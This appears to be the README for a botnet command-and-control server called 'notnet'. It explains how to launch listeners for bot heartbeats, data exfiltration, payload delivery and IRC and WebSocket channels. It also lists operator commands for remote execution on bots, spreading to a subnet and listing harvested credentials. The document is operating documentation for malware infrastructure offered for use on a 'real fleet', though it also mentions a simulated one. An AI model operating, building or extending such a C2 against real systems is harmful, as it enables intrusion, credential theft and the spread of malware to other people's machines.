# notnet C2 server

Production operator console for the notnet bot. Implements the SAME wire
contract the sim mocks define (tests/sim/c2/c2_http.py) so one protocol
serves the real fleet and the sim fleet.

## Run

    python3 c2-server/c2.py \
      --secret <c2_secret> \
      --http-port 8080 --payload-port 8443 --console-port 8090 \
      --queue-dir queue --payload-dir payload --db c2.db

Listeners:

- `8080`  HTTP C2 — heartbeat/response POST `<http_path>` (default
  `/api/v1/bot`), exfil POST `<http_path>/exfil`, payload GET `/bot/<name>`,
  source bundle GET `/notnet-src.tar`
- `8443`  payload download port (same handler)
- `8081`  WebSocket C2 (RFC 6455) — heartbeat/inventory; commands served but
  the BOT cannot execute WS frames yet (see issue #120 — the bot's WS path
  stores the raw JSON frame but dispatch matches command prefixes)
- `6667`  IRC C2 (legacy channel) — welcome burst, heartbeat/inventory,
  targeted + untargeted command delivery
- `8090`  operator console — HTML dashboard + JSON API + queue endpoint

The bot connects with `http_server=<c2 host>`, `http_port=8080`,
`http_path=/api/v1/bot`, `c2_secret=<same secret>`. The bot auto-enables the
HTTP channel when the configured port is non-default (see load_config).

## Command queue

Operator commands go through a queue dir (same protocol as the sim: files,
atomic rename claim). Every queue entry may carry a `target` bot tag — a
targeted command is served only to the bot whose heartbeat tag matches;
untargeted commands go to the first bot on the channel. Serve the queue from
the dashboard's form or:

    c2-server/c2ctl queue exec uname -a --target <bot_tag>
    c2-server/c2ctl queue spread 172.29.10.0/28
    c2-server/c2ctl bots
    c2-server/c2ctl creds
    c2-server/c2ctl commands

## Security notes

- The `secret` in every heartbeat is verified. Wrong-secret heartbeats are
  logged (`AUTH-FAIL`) and never served commands.
- Responses echo the secret (the bot verifies it; see #35).
- The transport is cleartext by design (same as the bot's default build).
  TLS is future work — the bot's README marks it planned.
- SQLite state lives in `--db` (bots, commands, creds, exfil, events).

## Verification

`tests/` / the sim fleet can point at this server instead of the mocks: set
`SIM_QUEUE_DIR`/`SIM_PAYLOAD_DIR` to this server's dirs and the bot's
`http_server` to the server host. The driver's queue files (channel-tagged)
are served exactly like the sim mocks'.

Current status: HTTP + WebSocket + IRC channels, payload + exfil + console
implemented and verified end-to-end with the real binary
(`c2-server/smoke_test.sh`, 8 checks). Known bot gap: WS-served commands
are never executed (issue #120 — the bot queues the raw JSON frame but the
dispatch matches command prefixes). Sim-integration harness is next
(planned).
